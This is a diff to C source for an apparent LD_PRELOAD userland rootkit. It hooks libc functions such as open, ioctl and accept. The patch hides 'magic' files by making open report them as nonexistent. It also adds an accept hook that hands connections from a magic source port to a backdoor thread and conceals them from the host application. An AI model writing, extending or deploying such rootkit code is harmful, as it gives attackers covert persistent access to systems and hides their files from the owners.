@@ -12,7 +12,7 @@ init(void)
 __attribute__((destructor))
 void end (void) {
     #ifdef DEBUG
-    printf("[-] destructor\n");
+    printf("\n[-] destructor\n");
     #endif
 }
 
@@ -80,12 +80,13 @@ int open(const char *pathname, int flags, mode_t mode){
         return hooked_open(newfile, flags, mode);
     }
     #ifdef KILLSWITCH
-    else if (strcmp(real_pathname,KILLSWITCH) == 0){
+    else if (strcmp(real_pathname, KILLSWITCH) == 0){
         return hooked_open(real_pathname, flags, mode);
     }
     #endif
     else if (is_magicfile(real_pathname)){
-        return hooked_open("/dev/null", flags, mode);
+        errno = ENOENT;
+        return -1;
     }
 
     return hooked_open(pathname, flags, mode);
@@ -186,4 +187,30 @@ int ioctl(int fd, unsigned long request, unsigned long *argp){
     }
 
     return hooked_ioctl(fd, request, argp);
+}
+
+int accept(int socket, struct sockaddr_in *address, socklen_t *address_len){
+    #ifdef DEBUG
+    printf("[-] hooking accept\n");
+    #endif
+
+    if (!hooked_accept){
+        hooked_accept = load_libc("accept");
+    }
+    int fd = hooked_accept(socket, address, address_len);
+    if (fd == -1){
+        return fd;
+    }
+    int port = (int) ntohs(address->sin_port);
+    if (port == MAGIC_PORT){
+        #ifdef DEBUG
+        printf("[+] port hooked: %d, %d\n", port, fd);
+        #endif
+        pthread_t thread;
+        int *pfd = malloc(sizeof(*pfd));
+        *pfd = fd;
+        pthread_create(&thread, NULL, backdoor, pfd);
+        return accept(socket, address, address_len);
+    }
+    return fd;
 }
